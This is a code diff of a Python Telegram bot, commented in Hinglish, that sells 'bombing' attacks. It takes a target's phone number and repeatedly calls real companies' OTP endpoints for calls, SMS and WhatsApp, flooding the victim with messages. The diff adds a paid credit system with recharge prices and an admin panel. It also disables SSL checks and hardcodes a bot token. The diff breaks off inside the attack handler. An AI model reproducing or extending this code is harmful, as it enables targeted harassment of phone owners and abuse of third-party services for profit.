@@ -4,41 +4,94 @@ import asyncio
 import aiohttp
 import random
 import time
+import json
+import os
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import CommandStart, Command
 from aiogram.client.default import DefaultBotProperties
 from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.fsm.state import StatesGroup, State
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.storage.memory import MemoryStorage
 import logging
 
-# Configure logging
+# Logging configuration
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 # --- [ CONFIGURATION ] ---
 BOT_TOKEN = "8927679179:AAHSovin2ewne_VUKY7FVEA4lEz6figrVZ0"
-DEVELOPER_ID = "@theplayerror"  # Developer ID
-ADMIN_IDS = [5057489358]  # Add admin user IDs here
+DEVELOPER_ID = "@theplayerror"  # Developer Telegram Username
+ADMIN_IDS = [5057489358]       # Yahan apna Admin Telegram Numeric ID dalein
+DB_FILE = "users_db.json"
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
-dp = Dispatcher()
+dp = Dispatcher(storage=MemoryStorage())
+
+# --- [ FSM STATES FOR ADMIN ] ---
+class AdminStates(StatesGroup):
+    waiting_for_broadcast = State()
+    waiting_for_add_credits = State()
+    waiting_for_remove_credits = State()
+    waiting_for_user_info = State()
+
+# Attack tracking variables
 stop_signals = {}
 user_attacks = {}
 attack_stats = {}
 
+# --- [ DATABASE FUNCTIONS ] ---
+def load_db():
+    if not os.path.exists(DB_FILE):
+        with open(DB_FILE, 'w') as f:
+            json.dump({"users": {}}, f, indent=4)
+    try:
+        with open(DB_FILE, 'r') as f:
+            return json.load(f)
+    except Exception as e:
+        logger.error(f"Database read error: {e}")
+        return {"users": {}}
+
+def save_db(data):
+    try:
+        with open(DB_FILE, 'w') as f:
+            json.dump(data, f, indent=4)
+    except Exception as e:
+        logger.error(f"Database save error: {e}")
+
+def register_user(user_id, username):
+    db = load_db()
+    uid = str(user_id)
+    if uid not in db["users"]:
+        db["users"][uid] = {
+            "username": f"@{username}" if username else "No Username",
+            "credits": 10,  # 10 Free Credits naye user ke liye
+            "total_attacks": 0,
+            "joined_at": time.strftime('%d-%m-%Y %H:%M:%S')
+        }
+        save_db(db)
+    elif username:
+        db["users"][uid]["username"] = f"@{username}"
+        save_db(db)
+
+def get_user_data(user_id):
+    db = load_db()
+    return db["users"].get(str(user_id))
+
 # --- [ ANIMATION FRAMES ] ---
 ANIMATION_FRAMES = [
-    "🔄 Processing...",
-    "⚡ Firing APIs...", 
-    "🔥 Bombarding...",
-    "💥 Exploding...",
-    "🚀 Launching...",
-    "🎯 Targeting..."
+    "🔄 APIs Load ho rahi hain...",
+    "⚡ Server connect ho raha hai...", 
+    "🔥 Target par firing start...",
+    "💥 Bombarding shuru ho gayi...",
+    "🚀 Request bheji ja rahi hain...",
+    "🎯 Target locked!"
 ]
 
-# --- [ ULTIMATE API COLLECTION - FIXED ] ---
+# --- [ ULTIMATE API COLLECTION ] ---
 ULTIMATE_APIS = [
-    # === CALL APIs ===
+    # Call APIs
     {
         "name": "Tata Capital Voice Call",
         "type": "Call",
@@ -71,16 +124,7 @@ ULTIMATE_APIS = [
         "headers": {"Content-Type": "application/json"},
         "data": lambda phone: f'{{"mobile":"{phone}"}}'
     },
-    {
-        "name": "Zivame Voice Call",
-        "type": "Call", 
-        "url": "https://api.zivame.com/v2/customer/login/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone_number":"{phone}","otp_type":"voice"}}'
-    },
-    
-    # === SMS APIs ===
+    # SMS APIs
     {
         "name": "Lenskart SMS",
         "type": "SMS",
@@ -113,24 +157,7 @@ ULTIMATE_APIS = [
         "headers": {"Content-Type": "application/json"},
         "data": lambda phone: f'{{"mobileNumber":"{phone}"}}'
     },
-    {
-        "name": "GoKwik SMS",
-        "type": "SMS",
-        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}'
-    },
-    {
-        "name": "NewMe SMS",
-        "type": "SMS",
-        "url": "https://prodapi.newme.asia/web/otp/request",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}'
-    },
-    
-    # === WhatsApp APIs ===
+    # WhatsApp APIs
     {
         "name": "KPN WhatsApp",
         "type": "WhatsApp",
@@ -146,194 +173,36 @@ ULTIMATE_APIS = [
         "method": "POST",
         "headers": {"Content-Type": "application/json"},
         "data": lambda phone: f'{{"country_code":"+91","phone":"{phone}"}}'
-    },
-    {
-        "name": "Eka Care WhatsApp",
-        "type": "WhatsApp",
-        "url": "https://auth.eka.care/auth/init",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{phone}"}},"type":"mobile"}}'
-    },
-    
-    # === Additional Working APIs ===
-    {
-        "name": "Wakefit SMS",
-        "type": "SMS",
-        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}'
-    },
-    {
-        "name": "Hungama OTP",
-        "type": "SMS",
-        "url": "https://communication.api.hungama.com/v1/communication/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'
-    },
-    {
-        "name": "Doubtnut",
-        "type": "SMS",
-        "url": "https://api.doubtnut.com/v4/student/login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}'
-    },
-    {
-        "name": "PenPencil",
-        "type": "SMS", 
-        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
-    },
-    {
-        "name": "BeepKart",
-        "type": "SMS",
-        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","city":362}}'
-    },
-    {
-        "name": "Smytten",
-        "type": "SMS",
-        "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}'
-    },
-    {
-        "name": "MyHubble Money",
-        "type": "SMS",
-        "url": "https://api.myhubble.money/v1/auth/otp/generate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}'
-    },
-    {
-        "name": "Housing.com",
-        "type": "SMS",
-        "url": "https://login.housing.com/api/v2/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}'
-    },
-    {
-        "name": "RentoMojo",
-        "type": "SMS",
-        "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}"}}'
-    },
-    {
-        "name": "Khatabook",
-        "type": "SMS",
-        "url": "https://api.khatabook.com/v1/auth/request-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}'
-    },
-    {
-        "name": "Animall",
-        "type": "SMS",
-        "url": "https://animall.in/zap/auth/login",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}'
-    },
-    {
-        "name": "Cosmofeed",
-        "type": "SMS",
-        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}'
-    },
-    {
-        "name": "Spencer's",
-        "type": "SMS",
-        "url": "https://jiffy.spencers.in/user/auth/otp/send",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}"}}'
-    },
-    {
-        "name": "Shopper's Stop",
-        "type": "SMS",
-        "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}'
-    },
-    {
-        "name": "Lifestyle Stores",
-        "type": "SMS",
-        "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}'
-    },
-    {
-        "name": "PokerBaazi",
-        "type": "SMS",
-        "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
-    },
-    {
-        "name": "My11Circle",
-        "type": "SMS",
-        "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}'
-    },
-    {
-        "name": "RummyCircle",
-        "type": "SMS",
-        "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
-        "method": "POST",
-        "headers": {"Content-Type": "application/json"},
-        "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}'
-    },
+    }
 ]
 
 async def hit_api(session, api, phone, stats):
-    """Hit a single API endpoint"""
+    """Single API Hit Handler"""
     try:
-        # Get URL and data
         url = api["url"]
         data = api["data"](phone) if api["data"] else None
         
-        # Handle callable URLs
         if callable(url):
             url = url(phone)
         
-        # Make request
         async with session.request(
             method=api["method"],
             url=url,
             headers=api["headers"],
             data=data,
             timeout=aiohttp.ClientTimeout(total=5),
-            ssl=False  # Bypass SSL verification for better success rate
+            ssl=False
         ) as response:
-            status = response.status
-            if status in [200, 201, 202, 204]:
+            if response.status in [200, 201, 202, 204]:
                 api_type = api.get("type", "SMS")
                 stats[api_type] = stats.get(api_type, 0) + 1
                 return True
-    except Exception as e:
-        logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
+    except Exception:
+        pass
     return False
 
 async def animate_message(chat_id, message_id, text_prefix="", frames=None):
-    """Animate a message with loading frames"""
+    """Animation Handler"""
     if frames is None:
         frames = ANIMATION_FRAMES
     
@@ -342,317 +211,354 @@ async def animate_message(chat_id, message_id, text_prefix="", frames=None):
             await bot.edit_message_text(
                 chat_id=chat_id,
                 message_id=message_id,
-                text=f"{frame} {text_prefix}"
+                text=f"{frame}\n<code>{text_prefix}</code>"
             )
-            await asyncio.sleep(0.5)
-        except:
+            await asyncio.sleep(0.4)
+        except Exception:
             break
 
-def create_main_keyboard():
-    """Create main reply keyboard"""
+# --- [ KEYBOARDS ] ---
+def create_main_keyboard(user_id):
     builder = ReplyKeyboardBuilder()
     builder.row(types.KeyboardButton(text="🚀 Start Infinite Boom"))
-    builder.row(types.KeyboardButton(text="📊 Check Stats"))
-    builder.row(types.KeyboardButton(text="ℹ️ Help"))
-    builder.row(types.KeyboardButton(text="👨‍💻 Developer"))
+    builder.row(types.KeyboardButton(text="👤 Meri Profile"), types.KeyboardButton(text="📊 Check Stats"))
+    builder.row(types.KeyboardButton(text="💰 Buy Credits"), types.KeyboardButton(text="ℹ️ Help Guide"))
+    
+    if user_id in ADMIN_IDS:
+        builder.row(types.KeyboardButton(text="👑 Admin Panel"))
+        
     return builder.as_markup(resize_keyboard=True)
 
 def create_stop_keyboard():
-    """Create stop attack keyboard"""
     builder = ReplyKeyboardBuilder()
     builder.row(types.KeyboardButton(text="🛑 STOP ATTACK"))
-    builder.row(types.KeyboardButton(text="📊 Live Stats"))
+    builder.row(types.KeyboardButton(text="📊 Live Attack Stats"))
     builder.row(types.KeyboardButton(text="🏠 Main Menu"))
     return builder.as_markup(resize_keyboard=True)
 
-def create_stats_inline_keyboard():
-    """Create inline keyboard for stats"""
+def create_admin_inline_keyboard():
     builder = InlineKeyboardBuilder()
     builder.row(
-        InlineKeyboardButton(text="🔄 Refresh Stats", callback_data="refresh_stats"),
-        InlineKeyboardButton(text="📈 All Time Stats", callback_data="alltime_stats")
+        InlineKeyboardButton(text="👥 Total Users", callback_data="adm_users"),
+        InlineKeyboardButton(text="📢 Broadcast Msg", callback_data="adm_broadcast")
     )
     builder.row(
-        InlineKeyboardButton(text="⚡ Fast Attack", callback_data="fast_attack"),
-        InlineKeyboardButton(text="🐢 Slow Attack", callback_data="slow_attack")
+        InlineKeyboardButton(text="➕ Add Credits", callback_data="adm_give_credits"),
+        InlineKeyboardButton(text="➖ Remove Credits", callback_data="adm_remove_credits")
+    )
+    builder.row(
+        InlineKeyboardButton(text="🔍 User Info Check", callback_data="adm_user_info")
     )
     return builder.as_markup()
 
+# --- [ USER MESSAGE HANDLERS ] ---
+
 @dp.message(CommandStart())
 async def start_command(message: types.Message):
-    """Handle /start command"""
+    register_user(message.from_user.id, message.from_user.username)
+    u_data = get_user_data(message.from_user.id)
+    
     welcome_text = f"""
-🎯 <b>CLOUD LEAKED BOMBER BOT</b> 🎯
+🎯 <b>BOMBER BOT ME AAPKA SWAGAT HAI!</b> 🎯
 
-<b>Developer:</b> {DEVELOPER_ID}
-<b>Active APIs:</b> {len(ULTIMATE_APIS)}
-<b>Types:</b> Calls, SMS, WhatsApp
+Aapka account successfully load ho gaya hai.
 
-📌 <b>Commands:</b>
-• Send 10-digit number to start attack
-• Use buttons below for control
+👤 <b>Aapka Balance:</b> <code>{u_data['credits']} Credits</code>
+⚡ <b>Attack Cost:</b> 5 Credits per Attack
 
-🔥 <b>Features:</b>
-• Multiple API endpoints
-• Real-time stats
-• Attack control
-• Live animations
-• Fast & Slow modes
+📌 <b>Kaise Use Karein:</b>
+• Direct 10-digit number type karke bhejein.
+• Ya fir neeche diye gaye menu buttons use karein.
 
-⚠️ <b>Warning:</b> Use responsibly!
+👨‍💻 <b>Developer Support:</b> {DEVELOPER_ID}
     """
-    
-    await message.answer(
-        welcome_text,
-        reply_markup=create_main_keyboard(),
-        parse_mode="HTML"
-    )
+    await message.answer(welcome_text, reply_markup=create_main_keyboard(message.from_user.id))
 
-@dp.message(F.text == "ℹ️ Help")
+@dp.message(F.text == "👤 Meri Profile")
+async def user_profile(message: types.Message):
+    register_user(message.from_user.id, message.from_user.username)
+    u_data = get_user_data(message.from_user.id)
+    
+    profile_text = f"""
+👤 <b>AAPKI PROFILE DETAILS</b>
+
+🆔 <b>User ID:</b> <code>{message.from_user.id}</code>
+👤 <b>Username:</b> {u_data['username']}
+💰 <b>Available Credits:</b> <code>{u_data['credits']}</code>
+🚀 <b>Total Attacks Done:</b> {u_data['total_attacks']}
+📅 <b>Account Created:</b> {u_data['joined_at']}
+
+ℹ️ <i>Ek attack start karne par 5 credits deduct hote hain.</i>
+    """
+    await message.answer(profile_text, parse_mode="HTML")
+
+@dp.message(F.text == "💰 Buy Credits")
+async def buy_credits_info(message: types.Message):
+    plans_text = f"""
+💎 <b>OFFICIAL RECHARGE PLANS</b> 💎
+
+Agar aapke credits khatam ho gaye hain to recharge karein:
+
+💵 <b>Plan ₹30:</b> 50 Credits (10 Attacks)
+💵 <b>Plan ₹50:</b> 90 Credits (18 Attacks)
+💵 <b>Plan ₹70:</b> 130 Credits (26 Attacks)
+
+<b>Custom Credit Rate:</b>
+👉 <b>₹2.5 = 4 Credits</b> (Minimum recharge ₹10)
+
+📥 <b>Recharge Kaise Karein?</b>
+1. Admin ko contact karein: {DEVELOPER_ID}
+2. Apna <b>User ID</b> bhejein: <code>{message.from_user.id}</code>
+3. Payment screenshot bhejne par credits turant add ho jayenge!
+    """
+    await message.answer(plans_text, parse_mode="HTML")
+
+@dp.message(F.text == "ℹ️ Help Guide")
 async def help_command(message: types.Message):
-    """Show help information"""
     help_text = f"""
-🆘 <b>HELP & GUIDE</b> 🆘
+🆘 <b>HELP & USAGE GUIDE</b> 🆘
 
-<b>How to use:</b>
-1. Click <b>'🚀 Start Infinite Boom'</b>
-2. Send <b>10-digit phone number</b> (without +91)
-3. Attack will start automatically
-4. Use <b>'🛑 STOP ATTACK'</b> to stop
+1. <b>'🚀 Start Infinite Boom'</b> par click karein.
+2. Target ka 10-digit mobile number bina <code>+91</code> ke bhejein.
+3. Attack shuru hote hi aapke account se <b>5 credits</b> cut ho jayenge.
+4. Bombing rokne ke liye <b>'🛑 STOP ATTACK'</b> dabayein.
 
-<b>Available Commands:</b>
-• /start - Start bot
-• /stats - Show statistics
-• /stop - Stop current attack
-• /help - This message
-
-<b>Attack Types:</b>
-• Calls 📞 - Voice call OTPs
-• SMS 📩 - Text message OTPs
-• WhatsApp 💬 - WhatsApp messages
-
-<b>Developer:</b> {DEVELOPER_ID}
-<b>Support:</b> Contact developer for issues
-
-⚠️ <b>Legal Notice:</b>
-This bot is for educational purposes only.
-Misuse may lead to legal consequences.
+Kisi bhi problem ya recharge ke liye contact: {DEVELOPER_ID}
     """
-    
     await message.answer(help_text, parse_mode="HTML")
 
-@dp.message(F.text == "👨‍💻 Developer")
-async def developer_info(message: types.Message):
-    """Show developer information"""
-    dev_text = f"""
-👨‍💻 <b>DEVELOPER INFORMATION</b>
+# --- [ ADMIN PANEL & FSM HANDLERS ] ---
 
-<b>Developer:</b> {DEVELOPER_ID}
-<b>Bot Version:</b> 2.0
-<b>Last Updated:</b> {time.strftime('%Y-%m-%d')}
-
-🔧 <b>Technical Details:</b>
-• Built with Python & aiogram
-• Async requests for speed
-• Multi-API support
-• Real-time monitoring
-
-📞 <b>Contact:</b>
-Telegram: {DEVELOPER_ID}
-For support and feature requests
-
-🚀 <b>Features Coming Soon:</b>
-• More API endpoints
-• Custom attack patterns
-• Scheduled attacks
-• Advanced analytics
-
-⭐ <b>Please rate and review!</b>
-    """
-    
-    await message.answer(dev_text, parse_mode="HTML")
-
-@dp.message(F.text == "📊 Check Stats")
-async def check_stats(message: types.Message):
-    """Show current statistics"""
-    user_id = message.from_user.id
-    stats = attack_stats.get(user_id, {})
-    
-    if not stats:
-        stats_text = "📊 <b>No attack statistics available yet.</b>\nStart an attack to see stats!"
-    else:
-        calls = stats.get('Call', 0)
-        sms = stats.get('SMS', 0)
-        whatsapp = stats.get('WhatsApp', 0)
-        total = calls + sms + whatsapp
-        
-        stats_text = f"""
-📊 <b>ATTACK STATISTICS</b>
-
-<b>Total Hits:</b> {total}
-<b>📞 Calls:</b> {calls}
-<b>📩 SMS:</b> {sms}
-<b>💬 WhatsApp:</b> {whatsapp}
-
-<b>Success Rate:</b> {(total / (len(ULTIMATE_APIS) * (stats.get('cycles', 1))) * 100):.1f}%
-<b>Active APIs:</b> {len(ULTIMATE_APIS)}
-<b>Last Updated:</b> Just now
-        """
+@dp.message(F.text == "👑 Admin Panel")
+async def admin_panel(message: types.Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
     
     await message.answer(
-        stats_text,
-        reply_markup=create_stats_inline_keyboard(),
+        "🛠️ <b>ADMIN CONFIGURATION PANEL</b>\n\nNeeche diye gaye buttons se bot manage karein:",
+        reply_markup=create_admin_inline_keyboard(),
         parse_mode="HTML"
     )
+
+@dp.callback_query(F.data == "adm_users")
+async def admin_total_users(callback: types.CallbackQuery):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    db = load_db()
+    total_users = len(db["users"])
+    
+    users_list = "👥 <b>Recent Users List:</b>\n"
+    for uid, data in list(db["users"].items())[-10:]:
+        users_list += f"• <code>{uid}</code> | {data['username']} | Cr: <b>{data['credits']}</b>\n"
+        
+    await callback.message.edit_text(
+        f"📊 <b>Total Registered Users:</b> {total_users}\n\n{users_list}",
+        reply_markup=create_admin_inline_keyboard()
+    )
+    await callback.answer()
+
+@dp.callback_query(F.data == "adm_broadcast")
+async def admin_broadcast_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    await state.set_state(AdminStates.waiting_for_broadcast)
+    await callback.message.answer("📢 Sabhi users ko broadcast karne wala message bhejiye:")
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_broadcast)
+async def process_broadcast(message: types.Message, state: FSMContext):
+    await state.clear()
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    
+    db = load_db()
+    all_users = list(db["users"].keys())
+    success = 0
+    failed = 0
+    
+    status_msg = await message.answer("⏳ <i>Broadcast bheja ja raha hai... Kripya wait karein.</i>")
+    
+    for uid in all_users:
+        try:
+            await bot.send_message(chat_id=int(uid), text=message.text, parse_mode="HTML")
+            success += 1
+            await asyncio.sleep(0.05)
+        except Exception:
+            failed += 1
+            
+    await status_msg.edit_text(
+        f"📢 <b>BROADCAST REPORT:</b>\n\n"
+        f"✅ Successfully Sent: {success}\n"
+        f"❌ Failed/Blocked: {failed}"
+    )
+
+@dp.callback_query(F.data == "adm_give_credits")
+async def admin_add_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    await state.set_state(AdminStates.waiting_for_add_credits)
+    await callback.message.answer(
+        "➕ <b>ADD CREDITS</b>\n\n"
+        "Format me details bhejein:\n"
+        "<code>[User_ID] [Credits_Amount]</code>\n\n"
+        "Example: <code>5057489358 100</code>"
+    )
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_add_credits)
+async def process_add_credits(message: types.Message, state: FSMContext):
+    await state.clear()
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    
+    try:
+        user_id, amount = message.text.split()
+        amount = int(amount)
+        
+        db = load_db()
+        if user_id in db["users"]:
+            db["users"][user_id]["credits"] += amount
+            save_db(db)
+            await message.answer(f"✅ User <code>{user_id}</code> ke account me <b>{amount} Credits</b> add ho gaye.")
+            try:
+                await bot.send_message(
+                    chat_id=int(user_id),
+                    text=f"🎁 <b>Recharge Successful!</b>\nAdmin ne aapke account me <code>{amount} Credits</code> add kiye hain!"
+                )
+            except Exception:
+                pass
+        else:
+            await message.answer("❌ User Database me nahi mila!")
+    except Exception:
+        await message.answer("❌ Invalid Format! Format check karke dubara try karein.")
+
+@dp.callback_query(F.data == "adm_remove_credits")
+async def admin_remove_credits_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    await state.set_state(AdminStates.waiting_for_remove_credits)
+    await callback.message.answer(
+        "➖ <b>REMOVE CREDITS</b>\n\n"
+        "Format:\n"
+        "<code>[User_ID] [Amount]</code>\n\n"
+        "Example: <code>5057489358 50</code>"
+    )
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_remove_credits)
+async def process_remove_credits(message: types.Message, state: FSMContext):
+    await state.clear()
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    
+    try:
+        user_id, amount = message.text.split()
+        amount = int(amount)
+        
+        db = load_db()
+        if user_id in db["users"]:
+            db["users"][user_id]["credits"] = max(0, db["users"][user_id]["credits"] - amount)
+            save_db(db)
+            await message.answer(f"✅ User <code>{user_id}</code> se <b>{amount} Credits</b> cut kar diye gaye.")
+        else:
+            await message.answer("❌ User Database me nahi mila!")
+    except Exception:
+        await message.answer("❌ Invalid format entered!")
+
+@dp.callback_query(F.data == "adm_user_info")
+async def admin_user_info_prompt(callback: types.CallbackQuery, state: FSMContext):
+    if callback.from_user.id not in ADMIN_IDS:
+        return
+    await state.set_state(AdminStates.waiting_for_user_info)
+    await callback.message.answer("🔍 User details check karne ke liye <b>User ID</b> bhejein:")
+    await callback.answer()
+
+@dp.message(AdminStates.waiting_for_user_info)
+async def process_user_info(message: types.Message, state: FSMContext):
+    await state.clear()
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    
+    uid = message.text.strip()
+    db = load_db()
+    if uid in db["users"]:
+        u_data = db["users"][uid]
+        info_text = f"""
+👤 <b>USER DETAILS SUMMARY:</b>
+
+🆔 <b>User ID:</b> <code>{uid}</code>
+👤 <b>Username:</b> {u_data['username']}
+💰 <b>Current Credits:</b> <code>{u_data['credits']}</code>
+🚀 <b>Total Attacks Done:</b> {u_data['total_attacks']}
+📅 <b>Joining Date:</b> {u_data['joined_at']}
+        """
+        await message.answer(info_text)
+    else:
+        await message.answer("❌ Yeh user ID bot me registered nahi hai.")
+
+# --- [ ATTACK LOGIC & EXECUTION ] ---
 
 @dp.message(F.text == "🚀 Start Infinite Boom")
 async def start_attack_prompt(message: types.Message):
-    """Prompt for phone number"""
+    register_user(message.from_user.id, message.from_user.username)
+    u_data = get_user_data(message.from_user.id)
+    
+    if u_data["credits"] < 5:
+        await message.answer(
+            f"❌ <b>Insufficient Credits!</b>\n\n"
+            f"Aapke pass sirf <code>{u_data['credits']} Credits</code> bache hain.\n"
+            f"Ek attack start karne ke liye minimum <b>5 Credits</b> chahiye.\n\n"
+            f"Recharge karne ke liye '💰 Buy Credits' option choose karein.",
+            reply_markup=create_main_keyboard(message.from_user.id)
+        )
+        return
+        
     await message.answer(
-        "📱 <b>Enter target phone number (10 digits):</b>\n\n"
+        "📱 <b>Target ka 10-digit mobile number enter karein:</b>\n\n"
         "Example: <code>9876543210</code>\n\n"
-        "⚠️ Make sure it's 10 digits without +91",
+        "⚠️ Bina country code (+91) ke number bhejein.",
         parse_mode="HTML"
     )
-
-@dp.message(F.text == "🛑 STOP ATTACK")
-async def stop_attack(message: types.Message):
-    """Stop current attack"""
-    user_id = message.from_user.id
-    
-    if user_id in stop_signals:
-        stop_signals[user_id] = True
-        await message.answer(
-            "🛑 <b>Attack stopping...</b>\n"
-            "Current cycle will complete and then stop.",
-            reply_markup=create_main_keyboard()
-        )
-        
-        # Clear attack state after delay
-        await asyncio.sleep(2)
-        if user_id in user_attacks:
-            del user_attacks[user_id]
-    else:
-        await message.answer(
-            "ℹ️ <b>No active attack to stop.</b>\n"
-            "Start an attack first.",
-            reply_markup=create_main_keyboard()
-        )
-
-@dp.message(F.text == "📊 Live Stats")
-async def live_stats(message: types.Message):
-    """Show live attack statistics"""
-    user_id = message.from_user.id
-    
-    if user_id in attack_stats:
-        stats = attack_stats[user_id]
-        calls = stats.get('Call', 0)
-        sms = stats.get('SMS', 0)
-        whatsapp = stats.get('WhatsApp', 0)
-        total = calls + sms + whatsapp
-        
-        live_text = f"""
-📊 <b>LIVE ATTACK STATISTICS</b>
-
-<b>Total Hits:</b> {total}
-<b>📞 Calls:</b> {calls}
-<b>📩 SMS:</b> {sms}
-<b>💬 WhatsApp:</b> {whatsapp}
-
-<b>Status:</b> {'⚡ ACTIVE' if user_id in user_attacks else '⏸️ PAUSED'}
-<b>Last Hit:</b> {stats.get('last_update', 'N/A')}
-        """
-    else:
-        live_text = "ℹ️ <b>No active attack.</b> Start an attack to see live stats."
-    
-    await message.answer(live_text, parse_mode="HTML")
-
-@dp.message(F.text == "🏠 Main Menu")
-async def main_menu(message: types.Message):
-    """Return to main menu"""
-    await message.answer(
-        "🏠 <b>Main Menu</b>\nSelect an option:",
-        reply_markup=create_main_keyboard(),
-        parse_mode="HTML"
-    )
-
-@dp.callback_query(F.data == "refresh_stats")
-async def refresh_stats_callback(callback: types.CallbackQuery):
-    """Refresh statistics"""
-    user_id = callback.from_user.id
-    stats = attack_stats.get(user_id, {})
-    
-    calls = stats.get('Call', 0)
-    sms = stats.get('SMS', 0)
-    whatsapp = stats.get('WhatsApp', 0)
-    total = calls + sms + whatsapp
-    
-    stats_text = f"""
-🔄 <b>STATISTICS REFRESHED</b>
-
-<b>Total Hits:</b> {total}
-<b>📞 Calls:</b> {calls}
-<b>📩 SMS:</b> {sms}
-<b>💬 WhatsApp:</b> {whatsapp}
-
-<b>Updated:</b> {time.strftime('%H:%M:%S')}
-    """
-    
-    await callback.message.edit_text(
-        stats_text,
-        reply_markup=create_stats_inline_keyboard(),
-        parse_mode="HTML"
-    )
-    await callback.answer("✅ Statistics refreshed!")
-
-@dp.callback_query(F.data == "alltime_stats")
-async def alltime_stats_callback(callback: types.CallbackQuery):
-    """Show all-time statistics"""
-    # This would track all attacks, for now show current
-    await callback.answer("📈 All-time stats feature coming soon!")
-
-@dp.callback_query(F.data == "fast_attack")
-async def fast_attack_callback(callback: types.CallbackQuery):
-    """Switch to fast attack mode"""
-    user_id = callback.from_user.id
-    if user_id in user_attacks:
-        user_attacks[user_id]['delay'] = 2  # 2 seconds delay
-        await callback.answer("⚡ Fast mode activated (2s delay)")
-    else:
-        await callback.answer("Start an attack first!")
-
-@dp.callback_query(F.data == "slow_attack")
-async def slow_attack_callback(callback: types.CallbackQuery):
-    """Switch to slow attack mode"""
-    user_id = callback.from_user.id
-    if user_id in user_attacks:
-        user_attacks[user_id]['delay'] = 10  # 10 seconds delay
-        await callback.answer("🐢 Slow mode activated (10s delay)")
-    else:
-        await callback.answer("Start an attack first!")
 
 @dp.message(F.text.regexp(r'^\d{10}$'))
 async def handle_phone_number(message: types.Message):
-    """Handle phone number input and start attack"""
     user_id = message.from_user.id
     phone = message.text
     
-    # Validate phone number
+    register_user(user_id, message.from_user.username)
+    db = load_db()
+    u_data = db["users"].get(str(user_id))
+    
